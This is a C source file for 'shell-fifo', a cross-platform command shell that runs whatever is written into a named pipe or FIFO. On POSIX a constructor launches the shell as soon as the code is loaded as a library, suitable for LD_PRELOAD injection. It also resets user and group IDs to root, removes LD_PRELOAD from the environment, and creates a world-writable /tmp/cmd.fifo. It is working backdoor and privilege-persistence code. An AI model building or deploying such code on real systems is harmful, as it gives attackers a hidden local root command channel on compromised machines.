#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#endif

#ifdef _WIN32
/* Normalise pipe path to Windows named-pipe form \\.\pipe\<name> */
static void normalise_pipe_path(const char* in, char* out, size_t out_sz) {
    if (strncmp(in, "\\\\.\\pipe\\", 9) == 0 || strncmp(in, "//./pipe/", 9) == 0) {
        snprintf(out, out_sz, "%s", in);
        return;
    }
    /* Strip any leading path separators / directories; keep basename */
    const char* base = in;
    for (const char* p = in; *p; ++p) {
        if (*p == '/' || *p == '\\') base = p + 1;
    }
    if (!*base) base = "cmd.fifo";
    snprintf(out, out_sz, "\\\\.\\pipe\\%s", base);
}

static void fifo_shell(const char* fifo_path) {
    char pipe_name[512];
    normalise_pipe_path(fifo_path, pipe_name, sizeof(pipe_name));

    fprintf(stderr, "[+] Starting FIFO shell with pipe: %s\n", pipe_name);

    HANDLE hPipe = CreateNamedPipeA(
        pipe_name,
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,
        4096, 4096,
        0,
        NULL);
    if (hPipe == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] Failed to create named pipe (%lu)\n",
                (unsigned long)GetLastError());
        return;
    }

    fprintf(stderr, "[+] Pipe created at %s\n", pipe_name);
    fprintf(stderr, "[+] Waiting for a client to connect...\n");

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
        fprintf(stderr, "[-] ConnectNamedPipe failed (%lu)\n",
                (unsigned long)GetLastError());
        CloseHandle(hPipe);
        return;
    }

    fprintf(stderr, "[+] Client connected, spawning shell\n");

    const char* comspec = getenv("COMSPEC");
    char cmdline[MAX_PATH];
    snprintf(cmdline, sizeof(cmdline), "%s", comspec ? comspec : "cmd.exe");

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = hPipe;
    si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
    si.hStdError  = GetStdHandle(STD_ERROR_HANDLE);

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcess failed (%lu)\n",
                (unsigned long)GetLastError());
        DisconnectNamedPipe(hPipe);
        CloseHandle(hPipe);
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
}
#else
static void fifo_shell(const char* fifo_path) {
    fprintf(stderr, "[+] Starting FIFO shell with path: %s\n", fifo_path);

    unlink(fifo_path);

    if (mkfifo(fifo_path, 0666) < 0 && errno != EEXIST) {
        fprintf(stderr, "[-] Failed to create FIFO: %s\n", strerror(errno));
        return;
    }

    fprintf(stderr, "[+] FIFO created/exists at %s\n", fifo_path);
    fprintf(stderr, "[+] Waiting for commands (send with: echo 'command' > %s)\n", fifo_path);

    int fd = open(fifo_path, O_RDONLY);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open FIFO: %s\n", strerror(errno));
        return;
    }

    fprintf(stderr, "[+] FIFO opened, spawning shell\n");

    dup2(fd, 0);
    close(fd);

    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");

    unsetenv("LD_PRELOAD");

    execl("/bin/sh", "sh", NULL);
    fprintf(stderr, "[-] Failed to execute shell: %s\n", strerror(errno));
}
#endif

#ifndef _WIN32
__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_FIFO_ACTIVE")) return;
    if (getenv("SHELL_FIFO_MAIN")) return;

    setenv("SHELL_FIFO_ACTIVE", "1", 1);
    const char* fifo_path = getenv("FIFO_PATH");
    if (!fifo_path) fifo_path = "/tmp/cmd.fifo";
    fifo_shell(fifo_path);
}
#endif

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
#ifdef _WIN32
    _putenv("SHELL_FIFO_MAIN=1");
    _putenv("SHELL_FIFO_ACTIVE=1");
#else
    setenv("SHELL_FIFO_MAIN", "1", 1);
    setenv("SHELL_FIFO_ACTIVE", "1", 1);
#endif

    char *fifo_path = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-fifo - FIFO command shell utility\n");
            printf("Usage: %s [options] [fifo_path]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -f <path>     FIFO path (default: /tmp/cmd.fifo on POSIX, cmd.fifo pipe on Windows)\n");
            printf("\nExamples:\n");
            printf("  %s                      # Use default FIFO/pipe\n", argv[0]);
            printf("  %s /tmp/myfifo          # Use custom FIFO path\n", argv[0]);
            printf("  %s -f /var/run/cmd      # Use -f option\n", argv[0]);
            printf("\nOn Windows, the path basename becomes \\\\.\\pipe\\<name>.\n");
            printf("\nEnvironment:\n");
            printf("  FIFO_PATH=<path>  FIFO path (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
            fifo_path = argv[++i];
        } else if (argv[i][0] != '-') {
            fifo_path = argv[i];
        }
    }

    if (!fifo_path) {
        fifo_path = getenv("FIFO_PATH");
    }

    if (!fifo_path) {
#ifdef _WIN32
        fifo_path = "cmd.fifo";
#else
        fifo_path = "/tmp/cmd.fifo";
#endif
    }

    fifo_shell(fifo_path);
    return 0;
}
#endif
